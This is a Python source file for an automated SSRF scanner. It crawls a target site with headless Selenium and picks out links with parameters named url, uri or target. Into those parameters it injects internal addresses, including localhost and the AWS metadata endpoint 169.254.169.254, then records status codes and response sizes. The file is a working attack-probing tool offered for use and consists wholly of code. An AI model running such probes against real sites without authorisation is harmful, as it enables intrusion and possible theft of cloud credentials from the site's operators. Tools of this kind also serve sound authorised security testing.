import time
import json
import re
import sys
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from concurrent.futures import ThreadPoolExecutor, as_completed

# List of SSRF payloads to test against candidate endpoints
ssrf_payloads = [
    'http://127.0.0.1',
    'http://localhost',
    'http://[::1]',
    'http://169.254.169.254'  # AWS metadata endpoint
]

def init_driver():
    """Initialize a headless Chrome WebDriver."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    # Ensure chromedriver is in your PATH or specify the executable_path parameter if needed
    driver = webdriver.Chrome(options=chrome_options)
    return driver

def is_valid_url(url):
    """Check if the URL has a scheme and network location."""
    parsed = urlparse(url)
    return bool(parsed.scheme) and bool(parsed.netloc)

def selenium_crawl(driver, url, visited, base_domain, max_depth=2, depth=0):
    """
    Recursively crawl pages using Selenium to capture dynamic content.
    Only internal links (matching base_domain) are followed.
    Returns a list of unique URLs found.
    """
    if depth > max_depth or url in visited:
        return []
    visited.add(url)
    print(f"Crawling: {url} (Depth: {depth})")
    try:
        driver.get(url)
        # Wait briefly for dynamic content to load (adjust as needed)
        time.sleep(2)
    except Exception as e:
        print(f"Error loading {url}: {e}")
        return []
    
    html = driver.page_source
    soup = BeautifulSoup(html, 'html.parser')
    found_urls = []
    for link in soup.find_all('a', href=True):
        href = link.get('href')
        full_url = urljoin(url, href)
        parsed_full = urlparse(full_url)
        # Ensure the URL is valid and internal (matches the base domain)
        if is_valid_url(full_url) and parsed_full.netloc == base_domain and full_url not in visited:
            found_urls.append(full_url)
            # Recursively crawl discovered links
            found_urls.extend(selenium_crawl(driver, full_url, visited, base_domain, max_depth, depth + 1))
    return list(set(found_urls))

def find_ssrf_candidates(urls):
    """
    Identify URLs with query parameters that include keywords often used in SSRF vectors,
    such as "url", "uri", or "target".
    """
    candidates = []
    pattern = re.compile(r'(url|uri|target)', re.IGNORECASE)
    for url in urls:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        for param in qs:
            if pattern.search(param):
                candidates.append(url)
                break
    return list(set(candidates))

def test_ssrf(url):
    """
    For a candidate URL, replace its SSRF-related query parameter(s) with each payload,
    send the request, and log the HTTP status code and content length.
    """
    results = {}
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)
    for param in qs:
        if re.search(r'(url|uri|target)', param, re.IGNORECASE):
            for payload in ssrf_payloads:
                qs_modified = qs.copy()
                qs_modified[param] = [payload]
                new_query = urlencode(qs_modified, doseq=True)
                modified_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, 
                                           parsed.params, new_query, parsed.fragment))
                try:
                    resp = requests.get(modified_url, timeout=5)
                    results[modified_url] = {
                        "status_code": resp.status_code,
                        "content_length": len(resp.content)
                    }
                except Exception as e:
                    results[modified_url] = {"error": str(e)}
    return results

def main():
    if len(sys.argv) < 2:
        print("Usage: python improved_ssrf_scanner.py <base_url>")
        sys.exit(1)
    base_url = sys.argv[1]
    base_domain = urlparse(base_url).netloc
    
    driver = init_driver()
    
    print("Starting dynamic crawl using Selenium...")
    visited = set()
    all_urls = selenium_crawl(driver, base_url, visited, base_domain, max_depth=2)
    print(f"Total internal URLs found: {len(all_urls)}")
    
    candidates = find_ssrf_candidates(all_urls)
    print(f"Potential SSRF candidate endpoints: {len(candidates)}")
    
    ssrf_results = {}
    # Use ThreadPoolExecutor to speed up SSRF testing concurrently
    with ThreadPoolExecutor(max_workers=10) as executor:
        future_to_candidate = {executor.submit(test_ssrf, candidate): candidate for candidate in candidates}
        for future in as_completed(future_to_candidate):
            candidate = future_to_candidate[future]
            try:
                test_results = future.result()
            except Exception as exc:
                test_results = {"error": str(exc)}
            ssrf_results[candidate] = test_results
    
    with open("ssrf_results.json", "w") as f:
        json.dump(ssrf_results, f, indent=4)
    
    print("Scan completed. Results saved to ssrf_results.json")
    driver.quit()

if __name__ == '__main__':
    main()
